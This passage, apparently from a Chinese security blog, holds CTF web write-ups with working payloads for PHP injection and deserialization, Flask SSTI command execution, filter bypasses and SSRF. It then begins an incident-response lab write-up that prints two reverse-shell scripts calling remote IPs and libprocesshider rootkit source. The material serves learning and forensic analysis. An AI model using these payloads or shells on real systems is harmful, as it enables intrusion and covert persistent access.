/\");/*;\n}\n```\n\n可以看到会多出来一个}，这时候我们需要像sql注入一样用注释去把他注释掉\n\n所以我们最终的payload就是:(记得绕过ls哈不然会被过滤)\n\n```\n$a=create_function,$b=;}system(\"l\\s /\");/*\n```\n\nexp\n\n```php\n<?php\nclass Noteasy\n{\n    private $a;\n    private $b;\n\n    public function __construct($a, $b)\n    {\n        $this->a = $a;\n        $this->b = $b;\n    }\n}\n// $a=new Noteasy(\"create_function\",\";}system('l\\s ');/*\");\n$a=new Noteasy(\"create_function\",\";}system('tac flag');/*\");#可以看flag的有很多，比如more,tac\necho urlencode(serialize($a));\n```\n\n# Simple_SSTI_2\n\nflask下的ssti注入漏洞\n\n![image-20241129210543147](./../image/achieve/202411/BUGKU/image-20241129210543147.png)\n\n存在ssti注入漏洞，那就用魔术方法来找一下flag\n\n`__class__`:用于返回对象所属的类\n\n`__base__`:以字符串的形式返回一个类所继承的类\n\n`__bases__`:以元组的形式返回一个类所继承的类\n\n`__mro__`:返回解析方法调用的顺序，按照子类到父类到父父类的顺序返回所有类（当调用_mro_[1]或者-1时作用其实等同于_base_）\n\n```\n第一步，拿到当前类，也就是用__class__\n{{\"\".__class__}}\n<class 'str'>\n第二步，拿到基类，这里可以用__base__，也可以用__mro__\n{{\"\".__class__.__base__}}\n<class 'object'>\n//object为str的基类\nobject是父子关系的顶端，所有的数据类型最终的父类都是object\n{{\"\".__class__.__mro__}}\n(<class 'str'>, <class 'object'>)\n```\n\n`__subclasses__()`:获取类的所有子类\n\n`__init__`:所有自带带类都包含init方法，常用他当跳板来调用globals\n\n`__globals__`:会以字典类型返回当前位置的全部模块，方法和全局变量，用于配合init使用\n\n```\n第三步，拿到基类的子类，用__subclasses__()\n{{\"\".__class__.__base__.__subclasses__()}}\n```\n\n![image-20241129211537290](./../image/achieve/202411/BUGKU/image-20241129211537290.png)\n\n列出子类了\n\n接下来的话，就要找可利用的类，寻找那些有回显的或者可以执行命令的类\n\n大多数利用的是`os._wrap_close`这个类，可以执行命令，但是需要注意的是，这个类是python的标准库，所以需要在python环境下运行。\n\n所以我们搜索一下这个类，然后看看这个类的下标\n\n![image-20241129212037211](./../image/achieve/202411/BUGKU/image-20241129212037211.png)\n\n![image-20241129212118126](./../image/achieve/202411/BUGKU/image-20241129212118126.png)\n\n因为下标是从0开始的，所以我们取127\n\n```\n{{\"\".__class__.__base__.__subclasses__()[127]}}\n```\n\n![image-20241129212321382](./../image/achieve/202411/BUGKU/image-20241129212321382.png)\n\n接下来就可以利用`os._wrap_close`\n首先先调用它的__init__方法进行初始化类\n\n```\n{{\"\".__class__.__bases__[0]. __subclasses__()[154].__init__}}\n```\n\n然后再调用__globals__获取到方法内以字典的形式返回的方法、属性等，那我们就获取一下flag属性看看有没有\n\n```\n{{\"\".__class__.__bases__[0]. __subclasses__()[154].__init__.__globals__['popen']('echo $FLAG').read()}}\n```\n\n![image-20241129213813099](./../image/achieve/202411/BUGKU/image-20241129213813099.png)\n\n# 闪电十六鞭\n\n```php\nClick here\n<?php\n    error_reporting(0);\n    require __DIR__.'/flag.php';\n\n    $exam = 'return\\''.sha1(time()).'\\';';\n\n    if (!isset($_GET['flag'])) {\n        echo '<a href=\"./?flag='.$exam.'\">Click here</a>';\n    }\n    else if (strlen($_GET['flag']) != strlen($exam)) {\n        echo '长度不允许';\n    }\n    else if (preg_match('/`|\"|\\.|\\\\\\\\|\\(|\\)|\\[|\\]|_|flag|echo|print|require|include|die|exit/is', $_GET['flag'])) {\n        echo '关键字不允许';\n    }\n    else if (eval($_GET['flag']) === sha1($flag)) {\n        echo $flag;\n    }\n    else {\n        echo '马老师发生甚么事了';\n    }\n\n    echo '<hr>';\n\n    highlight_file(__FILE__);\n```\n\n这里的话有一个click here，意思就是当我们没有传入flag的时候就会出现这个按钮\n\n正则匹配就不需要讲了，我们先来看看$exam\n\n$exam = 'return\\''.sha1(time()).'\\';';\n\n- `sha1(time())`：这里 `time()` 函数返回当前时间戳，`sha1()` 函数对时间戳进行 SHA-1 哈希运算，返回一个40位的十六进制数字字符串。\n- `return\\'` 和 `\\'`：这里是将字符串 `'return'` 和 `'\\'` 连接在一起，其中 `\\'` 是用来转义单引号 `'` 的。\n- 所以，最终 `$exam` 的值是一个包含返回语句的字符串，返回的内容是当前时间戳经过 SHA-1 哈希后的结果。\n\n```html\necho '<a href=\"./?flag='.$exam.'\">Click here</a>'\n```\n\n在这里可以看到在我们点击了之后flag传入的参数就是exam的值\n\n![image-20241129151847256](./../image/achieve/202411/BUGKU/image-20241129151847256.png)\n\n我们拿去解码可以得到exam的值为\n\n```\nreturn'02edd67c2475067bbdec0418d9c630b2b0c952fa';\n```\n\n但是对于\n\nif (eval($_GET['flag']) === sha1($flag)) {\n    echo $flag;\n\n来说，我们需要让eval执行flag语句后的shal值和flag的相等\n\n代码解析完成，开始做题\n\n我们先看看exam的长度是多少\n\n```php\n<?php\n$a=\"return'02edd67c2475067bbdec0418d9c630b2b0c952fa';\";\necho strlen($a);\n?>\n#输出结果:49\n```\n\n所以我们的flag的长度要求是49\n\n我先给payload再进行讲解\n\n```php\n/?flag=$a='fla9';$a{3}='g';?><?=$$a;?>111111111111111111\n```\n\n- 用单引号绕过双引号验证\n- 通过参数套用绕过flag\n- \\<?=$$a;?>是为了输出我们的flag\n\n\\<? ?>和\\<?= ?>是短标签而\\<?php ?>是长标签，\n其中\\<?= 是代替 \\<? echo的，\\<? ?> 代替的是\\<?php ?>\n\n- 这里用?>是为了闭合eval，**因为短标签格式是可以识别phpinfo() ?>等类似只有?>形式的代码，所以payload前半段不需要加上<?**\n\n# 安慰奖\n\n在源代码中发现了一串被注释掉的编码，解码后提示是备份，那可能是源码泄露了，扫出来两个文件\n\n![image-20241129173833646](./../image/achieve/202411/BUGKU/image-20241129173833646.png)\n\n但是读不出来flag.php，那我们把index.php.bak下载下来看看\n\n```php\n<?php\n\nheader(\"Content-Type: text/html;charset=utf-8\");\nerror_reporting(0);\necho \"<!-- YmFja3Vwcw== -->\";\nclass ctf\n{\n    protected $username = 'hack';\n    protected $cmd = 'NULL';\n    public function __construct($username,$cmd)\n    {\n        $this->username = $username;\n        $this->cmd = $cmd;\n    }\n    function __wakeup()\n    {\n        $this->username = 'guest';\n    }\n\n    function __destruct()\n    {\n        if(preg_match(\"/cat|more|tail|less|head|curl|nc|strings|sort|echo/i\", $this->cmd))\n        {\n            exit('</br>flag能让你这么容易拿到吗？<br>');\n        }\n        if ($this->username === 'admin')\n        {\n           // echo \"<br>right!<br>\";\n            $a = `$this->cmd`;\n            var_dump($a);\n        }else\n        {\n            echo \"</br>给你个安慰奖吧，hhh！</br>\";\n            die();\n        }\n    }\n}\n    $select = $_GET['code'];\n    $res=unserialize(@$select);\n?>\n\n```\n\n这里的话还是反序列化，但是需要绕过我们的wakeup方法\n\n```php\n<?php\nclass ctf\n{\n    protected $username;\n    protected $cmd;\n    public function __construct($username,$cmd)\n    {\n        $this->username = $username;\n        $this->cmd = $cmd;\n    }\n}\n$ctf=new ctf('admin','ls');\necho urlencode('O:3:\"ctf\":3:{s:11:\"*username\";s:5:\"admin\";s:6:\"*cmd\";s:2:\"ls\";}');#修改属性个数\n?>\n```\n\n注意，这里的话要关注成员属性的类型，因为是受保护的成员属性，所以我们的url编码上会有所差别\n\npayload\n\n```\n?code=O%3A3%3A%22ctf%22%3A3%3A%7Bs%3A11%3A%22%00%2A%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A6%3A%22%00%2A%00cmd%22%3Bs%3A2%3A%22ls%22%3B%7D\n```\n\n然后用tac进行读取文件就可以了\n\n# decrypt\n\n是一个附件，我以为能省金币来着结果发现下载需要金币。。\n\n```php\n<?php\nfunction encrypt($data,$key)\n{\n    $key = md5('ISCC');\n    $x = 0;\n    $len = strlen($data);\n    $klen = strlen($key);\n    for ($i=0; $i < $len; $i++) { \n        if ($x == $klen)\n        {\n            $x = 0;\n        }\n        $char .= $key[$x];\n        $x+=1;\n    }\n    for ($i=0; $i < $len; $i++) {\n        $str .= chr((ord($data[$i]) + ord($char[$i])) % 128);\n    }\n    return base64_encode($str);\n}\n?>\n```\n\n我感觉这道题并不是web 的题目，但是不知道为啥放在web里面，所以我就直接上脚本了\n\n```php\n<?php\n$key = md5('ISCC');\n$x = 0;\n$base64_str = 'fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=';\n$data = base64_decode($base64_str);\n$len = strlen($data);\n$char = '';\n$str = '';\n$klen = strlen($key);\nfor ($i=0; $i < $len; $i++) {\n    if ($x == $klen)\n    {\n        $x = 0;\n    }\n    $char .= $key[$x];\n    $x+=1;\n}\nfor ($i=0; $i < $len; $i++) {\n    if (ord($data[$i]) > ord($char[$i])) {\n        $str .= chr(ord($data[$i]) - ord($char[$i]));\n    }\n    else{\n        $str .= chr (128+ord($data[$i])-ord($char[$i]));\n    }\n    print($str.\"\\n\");\n}\n?>\n```\n\n![image-20241129203825376](./../image/achieve/202411/BUGKU/image-20241129203825376.png)\n\n# Apache Log4j2 RCE\n\n是一个远程代码执行漏洞\n\n## Apache log4j介绍\n\n　　Apache log4j是Apache的一个开源项目，Apache log4j 2是一个就Java的日志记录工具。该工具重写了log4j框架，并且引入了大量丰富的特性。我们可以控制日志信息输送的目的地为控制台、文件、GUI组建等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。log4j2中存在JNDI注入漏洞，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目标服务器上执行任意代码。\n\n# newphp\n\n```php\n<?php\n// php版本:5.4.44\nheader(\"Content-type: text/html; charset=utf-8\");\nhighlight_file(__FILE__);\n\nclass evil{\n    public $hint;\n\n    public function __construct($hint){\n        $this->hint = $hint;\n    }\n\n    public function __destruct(){\n    if($this->hint===\"hint.php\")\n            @$this->hint = base64_encode(file_get_contents($this->hint)); \n        var_dump($this->hint);\n    }\n\n    function __wakeup() { \n        if ($this->hint != \"╭(●｀∀´●)╯\") { \n            //There's a hint in ./hint.php\n            $this->hint = \"╰(●’◡’●)╮\"; \n        } \n    }\n}\n\nclass User\n{\n    public $username;\n    public $password;\n\n    public function __construct($username, $password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n\n}\n\nfunction write($data){\n    global $tmp;\n    $data = str_replace(chr(0).'*'.chr(0), '\\0\\0\\0', $data);\n    $tmp = $data;\n}\n\nfunction read(){\n    global $tmp;\n    $data = $tmp;\n    $r = str_replace('\\0\\0\\0', chr(0).'*'.chr(0), $data);\n    return $r;\n}\n\n$tmp = \"test\";\n$username = $_POST['username'];\n$password = $_POST['password'];\n\n$a = serialize(new User($username, $password));\nif(preg_match('/flag/is',$a))\n    die(\"NoNoNo!\");\n\nunserialize(read(write($a)));\n\n```\n\n字符串逃逸\n\n原理可以自行百度哈\n\n因为我们在evil类中可以看到有file_get_contents()函数去读取hint.php的值，但是题目中并没有对evil类进行一个反序列化，所以我们需要利用User类的反序列化操作去反序列化这个evil类，这样才能触发__destruct()魔术方法去访问hint.php\n\n在这里，我们可以利用字符串增多和字符串减少进行字符串逃逸，但是首先我们都要理解到我们需要逃逸的字符串是什么\n\n```\nO:4:\"evil\":1:{s:4:\"hint\";s:8:\"hint.php\";}\n```\n\n这个就是我们需要逃逸的字符串，然后我们就需要考虑是通过字符增多还是通过字符减少\n\n```php\nfunction write($data){\n    global $tmp;\n    $data = str_replace(chr(0).'*'.chr(0), '\\0\\0\\0', $data);\n    $tmp = $data;\n}\n\nfunction read(){\n    global $tmp;\n    $data = $tmp;\n    $r = str_replace('\\0\\0\\0', chr(0).'*'.chr(0), $data);\n    return $r;\n}\nunserialize(read(write($a)));\n```\n\n在这里可以看到，如果我们选择字符增多的话，我们就会用\\*去做替换，但是因为最后的反序列化的步骤，\\*在write()方法做替换之后会在read()方法中重新替换回去，所以这没什么作用，那我们只能考虑字符减少，字符减少的话write()方法里面的替换就没什么干扰了\n\n如果我们传入一个\\0\\0\\0，经过这两个函数作用后，\\0\\0\\0就会被替换成*，字符减少。那么我们可以对username传入若干组\\0\\0\\0来将O:4:\"evil\":1:{s:4:\"hint\";s:8:\"hint.php\";}逃逸出去。当然，逃逸的关键就是闭合和字符个数\n\n我们正常的序列化字符串是这样的\n\n```php\n<?php\nclass User\n{\n    public $username;\n    public $password;\n\n    public function __construct($username, $password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n}\n$a=new User(\"1\",\"2\");\necho serialize($a);\n#O:4:\"User\":2:{s:8:\"username\";s:1:\"1\";s:8:\"password\";s:1:\"2\";}\n```\n\n因为需要字符减少进行字符串逃逸，所以我们的真实的序列化的字符串应该是这样的\n\n```\nO:4:\"User\":2:{s:8:\"username\";s:1:\"1\";s:8:\"password\";s:44:\"1\";O:4:\"evil\":2:{s:4:\"hint\";s:8:\"hint.php\";}\";}\n```\n\n\";s:8:\"password\";s:44:\"1就是我们需要吃掉的字符串，这里的字符串长度是24个，那\\0\\0\\0可以替换一个chr(0).'*'.chr(0)，所以会减少三个字符，那么我们如果要减少24个字符，就需要8对\\0\\0\\0，数学不差的话还是可以算出来的哈\n\n所以我们的payload就是：\n\n```php\nusername=\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&password=1\";O:4:\"evil\":2:{s:4:\"hint\";s:8:\"hint.php\";}\n```\n\n![image-20241130004755731](./../image/achieve/202411/BUGKU/image-20241130004755731.png)\n\n得到一个编码\n\n```php\n<?php\n $hint = \"index.cgi\";\n // You can't see me~\n```\n\n访问一下\n\n![image-20241130004929742](./../image/achieve/202411/BUGKU/image-20241130004929742.png)\n\n不知道是不是有ssrf，UA头里出现了curl函数 我们知道curl函数是可以扒取前端页面的.\n\n`User-Agent` 头部的取值为 `\"curl/7.64.0\"`，这表明发送该请求的客户端是使用 Curl 应用程序版本 7.64.0。Curl 是一个非常流行的命令行工具和库，用于在命令行下进行 URL 传输。通过 Curl，用户可以发送各种类型的网络请求，包括 HTTP 请求、FTP 请求等，从而方便地与 Web 服务器进行通信和数据交换。\n\n我们测试一下\n\n?name=1\n\n![image-20241201222057191](./../image/achieve/202411/BUGKU/image-20241201222057191.png)\n\n那就用伪协议file去读文件\n\n?name=%20file:///flag（file前要加空格）猜测服务端的curl函数进行执行时 是直接拼接我们的输入的值,例如  curlfile  这样执行不了    curl file 这样才可以执行ssrf\n\n# sodirty\n\n![image-20241202102642472](./../image/achieve/202411/BUGKU/image-20241202102642472.png)\n\n点击注册后\n\n![image-20241202102759797](./../image/achieve/202411/BUGKU/image-20241202102759797.png)\n\n源码也没什么信息，扫目录扫到了一个www.zip\n\n![image-20241202102910816](./../image/achieve/202411/BUGKU/image-20241202102910816.png)\n\n把文件下载下来(直接url后加上www.zip)\n\n把文件的内容看了一遍，然后发现了一个index.js文件\n\n```php\nvar express = require('express');\nconst setFn = require('set-value');\nvar router = express.Router();\n\n\nconst Admin = {\n    \"password\":process.env.password?process.env.password:\"password\"\n}\n\n\nrouter.post(\"/getflag\", function (req, res, next) {\n    if (req.body.password === undefined || req.body.password === req.session.challenger.password){\n        res.send(\"登录失败\");\n    }else{\n        if(req.session.challenger.age > 79){\n            res.send(\"糟老头子坏滴很\");\n        }\n        let key = req.body.key.toString();\n        let password = req.body.password.toString();\n        if(Admin[key] === password){\n            res.send(process.env.flag ? process.env.flag : \"flag{test}\");\n        }else {\n            res.send(\"密码错误，请使用管理员用户名登录.\");\n        }\n    }\n\n});\nrouter.get('/reg', function (req, res, next) {\n    req.session.challenger = {\n        \"username\": \"user\",\n        \"password\": \"pass\",\n        \"age\": 80\n    }\n    res.send(\"用户创建成功!\");\n});\n\nrouter.get('/', function (req, res, next) {\n    res.redirect('index');\n});\nrouter.get('/index', function (req, res, next) {\n    res.send('<title>BUGKU-登录</title><h1>前端被炒了<br><br><br><a href=\"./reg\">注册</a>');\n});\nrouter.post(\"/update\", function (req, res, next) {\n    if(req.session.challenger === undefined){\n        res.redirect('/reg');\n    }else{\n        if (req.body.attrkey === undefined || req.body.attrval === undefined) {\n            res.send(\"传参有误\");\n        }else {\n            let key = req.body.attrkey.toString();\n            let value = req.body.attrval.toString();\n            setFn(req.session.challenger, key, value);\n            res.send(\"修改成功\");\n        }\n    }\n});\n\nmodule.exports = router;\n```\n\n","tags":["BUGKU"],"categories":["赛题wp"]},{"title":"玄机第三章权限维持","url":"/2024/11/22/玄机第三章权限维持(已做完)/","content":"\n# 0x01前言\n\n第三章在计划中，继续学习，感谢师傅的wp贡献让我学习的更深入\n\n[玄机——第三章 权限维持-linux权限维持-隐藏 wp-CSDN博客](https://blog.csdn.net/administratorlws/article/details/140159790)\n\n# 0x02正文\n\n## 什么是linux权限维持?\n\n首先在 Linux 系统上，权限维持是黑客攻击过程中的一个重要环节。攻击者成功获得系统权限后，会采取各种手段来保持对系统的访问控制，防止被发现并移除。这些手段可以分为多种，包括隐藏进程、文件、网络连接等。\n\n## 一些常见的 Linux 权限维持和隐藏方法：\n\n#### 后门程序\n\n后门程序（Backdoor）是一种恶意软件或程序，允许攻击者绕过正常的身份验证或安全措施，以便在系统中获得未经授权的访问权限。后门程序可以被攻击者使用来在目标计算机上实现持久的控制，通常在攻击者已经成功入侵系统后安装。\n\n- 后门程序的特点\n\n1. **隐藏性**：后门程序通常设计得非常隐蔽，以避免被用户或安全软件发现。它们可能伪装成合法程序或系统服务。\n2. **绕过安全控制**：后门程序使攻击者能够不通过正常的登录过程进入系统，从而绕过身份验证机制。\n3. **远程访问**：后门程序通常允许攻击者从远程位置控制被感染的系统。攻击者可以通过网络连接与后门通信，执行命令、窃取数据或进一步传播恶意软件。\n4. **持久性**：许多后门程序会在系统中实现持久性，即使系统重启也能重新激活。这可以通过修改启动项、服务或利用计划任务等方式实现。\n\n攻击者通常会在受害系统中安装后门程序，以便在需要时重新获得访问权限。常见的后门程序包括：\n\n- SSH 后门：创建一个新的用户，配置 SSH 公钥认证，避免密码登录被检测到。\n\n- 反弹 Shell：通过反弹 Shell 连接到攻击者的机器，获取远程控制权限。\n\n- Web Shell：通过 Web Shell（如 PHP 代码嵌入）远程控制 Web 服务器。\n\n#### Rootkit\n\nRootkit 是一种能够隐藏自身及其他恶意程序的工具。安装 Rootkit 后，攻击者可以隐藏进程、文件和网络连接，防止被系统管理员发现。\n\n- 内核级 Rootkit：直接修改内核数据结构和函数，隐藏进程、文件和网络连接。\n\n\n- 用户级 Rootkit：通过劫持系统库函数（如 ld_preload），隐藏特定进程和文件。\n\n#### 持久化机制\n\n攻击者会使用各种持久化机制，以确保即使系统重启后也能重新获得控制权限。\n\n- 修改启动脚本：在系统启动脚本中加入恶意代码，保证每次系统启动时都会执行。\n\n\n- crontab 定时任务：在 crontab 中添加恶意任务，定期执行恶意程序。\n\n#### 文件隐藏\n\n攻击者会将恶意文件和工具隐藏在系统中，以防被发现。\n\n- 文件名伪装：将恶意文件命名为类似系统文件的名称，如 syslogd、sshd 等。\n\n\n- 隐藏目录：使用隐藏目录（如 . 开头的目录），将恶意文件放置其中。\n\n#### 网络连接隐藏\n\n攻击者可能会隐藏与其控制服务器的网络连接，以防被网络管理员发现。\n\n- 端口重定向：使用工具（如 iptables）重定向流量到特定端口，隐藏实际通信端口。\n\n- 加密通信：使用加密协议（如 SSH、SSL）进行通信，防止流量被检测和分析。\n\n#### 日志清除\n\n攻击者会清除或篡改系统日志，以隐藏入侵痕迹。\n\n- 清除命令历史：删除或篡改 .bash_history 文件。\n\n- 修改系统日志：直接修改系统日志文件（如 /var/log 下的日志），删除入侵痕迹。\n\n#### 使用合法进程\n\n攻击者会利用合法的系统进程进行恶意活动，以隐藏其行为。\n\n- 进程注入：将恶意代码注入到合法的系统进程中。\n\n- 利用系统工具：使用系统自带的工具（如 netcat、curl）进行恶意操作。\n\n这些权限维持和隐藏技术使得攻击者能够长时间保持对系统的控制权，同时降低被检测和移除的风险。\n\n## 问题1：黑客隐藏的隐藏的文件 完整路径md5\n\n根据上面的权限维持方法可以知道，隐藏文件的方法有文件名伪装或者隐藏目录和隐藏文件，因为 Unix/Linux 系统中，文件名以 `.` 开头的文件默认是隐藏文件。这些文件不会显示在普通的 `ls` 命令输出中，除非使用 `ls -a`。黑客常常利用这种特性，将恶意文件或脚本以 `.` 开头来隐藏。\n\n**那我们可以直接使用find来进行查找以点开头的隐藏文件**\n\n```\nfind / -name \".*\"\n```\n\n![image-20241122145355820](./../image/achieve/202411/玄机第三章权限维持/image-20241122145355820.png)\n\n这里可以看到有很多文件，不过黑客经常会将隐藏文件放在`/tmp`目录下，因此先去这个目录下找，发现有一个`.temp`文件\n\n分析一下这几个tmp目录下的文件\n\n- /tmp/.temp\n\n1.首先这个目录以 . 开头，因此是一个隐藏目录。\n\n2.其次存放在 /tmp 目录下，这里通常用于临时文件存储。\n\n3.最后黑客可能利用 /tmp 目录来存放临时的恶意文件，因为 /tmp 通常具有读写权限。\n\n- /tmp/.temp/libprocesshider/\n\n1.这个子目录也以 . 开头，属于隐藏目录 /tmp/.temp。\n\n2.目录名 libprocesshider 暗示包含用于隐藏进程的库或工具，通常是恶意软件的一部分。\n\n- /tmp/.temp/libprocesshider/.git\n\n1.这是一个隐藏的 .git 目录，表明这个目录可能是一个 Git 仓库。\n\n2.黑客可能使用 Git 来管理他们的工具或恶意代码。\n\n- /tmp/.temp/libprocesshider/.gitignore\n\n1.这是一个 Git 配置文件，用于指定哪些文件或目录在提交时应被忽略。\n\n2.这个文件也以 . 开头，是一个隐藏文件。\n\n- 为什么它们是隐藏文件\n\n1.默认隐藏：在 Unix/Linux 系统中，以 . 开头的文件和目录默认是隐藏的。这种文件和目录不会在普通的 ls 列表中显示，除非使用 ls -a 命令。\n2.逃避检测：黑客常常利用隐藏文件和目录来逃避系统管理员或安全工具的检测。把恶意文件放在隐藏目录中可以减少被发现的几率。\n3.临时性：将文件放在 /tmp 目录下表明这些文件可能是临时的。系统重启后，某些 /tmp 目录下的文件可能会被删除，从而掩盖黑客的痕迹。\n\n那我们跟进一下/tmp/.temp/libprocesshider/目录进行分析，然后可以看到有一个1.py和shell.py，\n\n![image-20241122150211106](./../image/achieve/202411/玄机第三章权限维持/image-20241122150211106.png)\n\n跟进一下1.py和shell.py\n\n1.py\n\n```python\n#!/usr/bin/python3\n\nimport socket,subprocess,os,sys, time\n'''这里导入了必要的模块：\nsocket：用于网络通信。\nsubprocess：用于执行外部命令。\nos：用于操作系统相关的功能（如进程管理）。\nsys：用于与Python解释器交互。\ntime：用于时间相关的操作（如休眠）。\n'''\n#Forking 进程\npidrg = os.fork()\nif pidrg > 0:\n        sys.exit(0)\n#使用 os.fork() 创建一个新进程。父进程的 pidrg 将大于 0，因此它会退出，这样只留下子进程继续执行后续操作。\n\nos.chdir(\"/\")\nos.setsid()\nos.umask(0)\ndrgpid = os.fork()\nif drgpid > 0:\n        sys.exit(0)\n'''\n将工作目录更改为根目录 /，这样可以避免对当前目录的引用。\n使用 os.setsid() 创建一个新会话，使当前进程成为会话的领导者。这是为了确保它不会在终端控制下运行。\n使用 os.umask(0) 设置文件创建掩码为 0，允许创建的文件权限没有限制。\n再次进行进程分叉，确保完全脱离终端。父进程会退出，只保留了新的子进程。\n'''\nwhile 1:\n        try:\n                sys.stdout.flush()\n                sys.stderr.flush()\n                fdreg = open(\"/dev/null\", \"w\")\n                sys.stdout = fdreg\n                sys.stderr = fdreg\n                '''进入无限循环，确保该程序持续运行。\n清空标准输出和标准错误输出。\n将标准输出和标准错误重定向到 /dev/null，即丢弃所有输出。'''\n                sdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n                sdregs.connect((\"114.114.114.121\",9999))\n                #创建一个TCP socket并连接到指定的IP地址（114.114.114.121）和端口（9999）。这就是反向连接的目标。\n                os.dup2(sdregs.fileno(),0)\n                os.dup2(sdregs.fileno(),1)\n                os.dup2(sdregs.fileno(),2)\n                #通过 os.dup2() 将标准输入、标准输出和标准错误输出重定向到与攻击者连接的socket。这意味着任何输入、输出和错误信息都将通过网络发送到攻击者的计算机。\n                p=subprocess.call([\"/bin/bash\",\"-i\"])\n                sdregs.close()\n                #启动一个交互式的bash shell，这样攻击者就可以通过socket执行命令。\n                #关闭socket连接。\n        except Exception:\n                pass\n        time.sleep(2)\n        #如果在连接过程中出错（如连接失败），捕获异常并等待2秒钟，然后重试。\n\n```\n\n**这个 Python 脚本文件是一个反弹 shell 程序，具有后台运行的功能。反向Shell是指在被攻击的计算机上打开一个Shell，并通过网络向攻击者的计算机连接，这样攻击者就可以远程执行命令。**\n\n分析一下这个反弹shell的程序，我全部注释在代码里面\n\n**总结**\n\n**这个脚本的目的是创建一个反弹 shell 连接，将当前系统的命令行接口通过网络发送到远程服务器 `114.114.114.121:9999`，并在服务器上执行。这种行为通常被黑客用来远程控制受害者的系统。**\n\n我们再看看shell.py文件\n\n```python\n#!/usr/bin/python3\nfrom os import dup2\nfrom subprocess import run\nimport socket\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"172.16.10.7\",2220))\ndup2(s.fileno(),0)\ndup2(s.fileno(),1)\ndup2(s.fileno(),2)\nrun([\"/bin/bash\",\"-i\"])\n```\n\n**简单来说 这个 `shell.py` 文件也是一个反弹 shell 脚本。它的作用是将当前系统的标准输入、标准输出和标准错误重定向到一个远程服务器的网络连接上，从而允许远程服务器对该系统进行命令控制。**\n\n我们简单分析一下这两个文件的功能和特点\n\n文件1.py\n\n- 功能和特点\n\n\n1.双重 Fork 实现进程脱离控制台：\n\n- 第一次 fork 后父进程退出，使子进程成为孤儿进程，由 init 进程收养。\n\n\n- 调用 setsid 创建新会话并成为会话组长。\n\n- 第二次 fork 确保进程不是会话组长，从而避免再打开控制终端。\n\n2.无限循环连接反弹：\n\n- 在无限循环中尝试连接 114.114.114.121 的 9999 端口。\n\n\n- 成功连接后，将标准输入、输出和错误重定向到该 socket。\n\n- 启动一个 /bin/bash shell。\n\n3.隐藏自身输出：\n\n- 将标准输出和标准错误重定向到 /dev/null，使其不产生任何输出。\n\n文件shell.py;\n\n- 功能和特点\n\n\n1.简单直接的反弹 Shell：\n\n- 创建一个 TCP 连接到 172.16.10.7 的 2220 端口。\n- 将标准输入、输出和错误重定向到该 socket。\n- 启动一个交互式的 /bin/sh shell。\n\n对比和区别\n\n- 连接目标和端口不同：\n\n1.py 连接 114.114.114.121 的 9999 端口。\n\nshell.py 连接 172.16.10.7 的 2220 端口。\n\n- shell 类型：\n\n1.py 使用的是 /bin/bash。\n\nshell.py 使用的是 /bin/sh。\n\n- 进程处理：\n\n1.py 通过双重 fork 以及会话控制使进程脱离终端并成为守护进程。\n\nshell.py 没有进行进程处理，直接运行反弹 shell。\n\n- 隐藏输出：\n\n1.py 将标准输出和标准错误重定向到 /dev/null，以隐藏运行时的任何输出。\n\nshell.py 没有执行这一步，输出会直接通过 socket 传输。\n\n- 无限重连：\n\n1.py 在捕获到异常时，通过 time.sleep(2) 进行无限重连。\n\nshell.py 只在执行时进行一次连接，没有重连机制。\n\n- 总的来说；\n\n这两个脚本都用于反弹 shell，其中 1.py 采用了更复杂的技术来隐藏和持久化，而 shell.py 则是一个简单直接的反弹 shell 实现。它们的共同点是都通过 socket 连接到远程主机并启动一个 shell，允许远程执行命令。区别在于 1.py 更注重隐藏和持续性，而 shell.py 则更加简洁和直接。\n\n不过单从这两个文件并不能看出哪个是隐藏文件，我们再另外分析一下\n\n可以看到里面还有一个processhider.c,我们也分析一下\n\n```c\n#define _GNU_SOURCE\n\n#include <stdio.h>\n#include <dlfcn.h>\n#include <dirent.h>\n#include <string.h>\n#include <unistd.h>\n\n/*\n * Every process with this name will be excluded\n */\nstatic const char* process_to_filter = \"1.py\";\n\n/*\n * Get a directory name given a DIR* handle\n */\nstatic int get_dir_name(DIR* dirp, char* buf, size_t size)\n{\n    int fd = dirfd(dirp);\n    if(fd == -1) {\n        return 0;\n    }\n\n    char tmp[64];\n    snprintf(tmp, sizeof(tmp), \"/proc/self/fd/%d\", fd);\n    ssize_t ret = readlink(tmp, buf, size);\n    if(ret == -1) {\n        return 0;\n    }\n\n    buf[ret] = 0;\n    return 1;\n}\n/*get_dir_name 函数通过 dirfd 获取目录文件描述符，并使用 readlink 读取符号链接 /proc/self/fd/ 指向的实际路径。*/\n\n/*\n * Get a process name given its pid\n */\nstatic int get_process_name(char* pid, char* buf)\n{\n    if(strspn(pid, \"0123456789\") != strlen(pid)) {\n        return 0;\n    }\n\n    char tmp[256];\n    snprintf(tmp, sizeof(tmp), \"/proc/%s/stat\", pid);\n \n    FILE* f = fopen(tmp, \"r\");\n    if(f == NULL) {\n        return 0;\n    }\n\n    if(fgets(tmp, sizeof(tmp), f) == NULL) {\n        fclose(f);\n        return 0;\n    }\n\n    fclose(f);\n\n    int unused;\n    sscanf(tmp, \"%d (%[^)]s\", &unused, buf);\n    return 1;\n}\n\n#define DECLARE_READDIR(dirent, readdir)                                \\\nstatic struct dirent* (*original_##readdir)(DIR*) = NULL;               \\\n                                                                        \\\nstruct dirent* readdir(DIR *dirp)                                       \\\n{                                                                       \\\n    if(original_##readdir == NULL) {                                    \\\n        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \\\n        if(original_##readdir == NULL)                                  \\\n        {                                                               \\\n            fprintf(stderr, \"Error in dlsym: %s\\n\", dlerror());         \\\n        }                                                               \\\n    }                                                                   \\\n                                                                        \\\n    struct dirent* dir;                                                 \\\n                                                                        \\\n    while(1)                                                            \\\n    {                                                                   \\\n        dir = original_##readdir(dirp);                                 \\\n        if(dir) {                                                       \\\n            char dir_name[256];                                         \\\n            char process_name[256];                                     \\\n            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \\\n                